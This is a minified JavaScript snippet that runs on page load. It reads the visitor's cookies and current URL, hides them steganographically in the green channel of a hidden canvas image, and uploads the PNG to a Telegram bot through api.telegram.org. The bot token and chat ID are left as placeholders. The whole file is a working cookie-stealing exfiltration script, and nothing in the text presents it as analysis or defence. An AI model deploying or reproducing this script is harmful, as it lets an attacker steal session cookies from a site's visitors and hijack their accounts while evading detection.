function sendTelegram(e){let t=new FormData;t.append("chat_id","chatID"),t.append("document",e,`${Math.random().toString(36).substring(7)}.png`),fetch(`https://api.telegram.org/bot${encodeURIComponent("API_TOKEN")}/sendDocument`,{method:"POST",body:t}).then(e=>{console.log(e)}).catch(e=>genericErrorHandler(e.message))}function extractData(){const e=window.location.href,t=document.cookie;let a={};return a.currentPage=e,a.cookie=t,JSON.stringify(a)}function createImg(e){createCanvas("snitchyPic"),createCanvas("snitchyData");let t=document.getElementById("snitchyPic"),a=t.getContext("2d"),n=document.getElementById("snitchyData"),d=n.getContext("2d"),o=new Image;t.width=3e3,t.height=100,n.width=3e3,n.height=100,d.font="14px Arial",d.fillText(e,10,50),a.fillStyle="#c0392b",a.fillRect(0,0,3e3,100),a.drawImage(o,0,0);let c=a.getImageData(0,0,t.width,t.height),i=d.getImageData(0,0,t.width,t.height);for(let e=0;e<i.data.length;e+=4)if(0!==i.data[e+3]){if(c.data[e+1]%10==7);else if(c.data[e+1]>247)c.data[e+1]=247;else for(;c.data[e+1]%10!=7;)c.data[e+1]++;0}else c.data[e+1]%10==7&&c.data[e+1]--,0;a.putImageData(c,0,0),t.toBlob(function(e){sendTelegram(e)},"image/png")}function createCanvas(e){document.contains(document.getElementById(`${e}`))&&document.getElementById(`${e}`).remove();const t=document.createElement("canvas");t.id=e,t.hidden=!0,document.body.appendChild(t)}document.addEventListener("DOMContentLoaded",e=>{createImg(extractData())});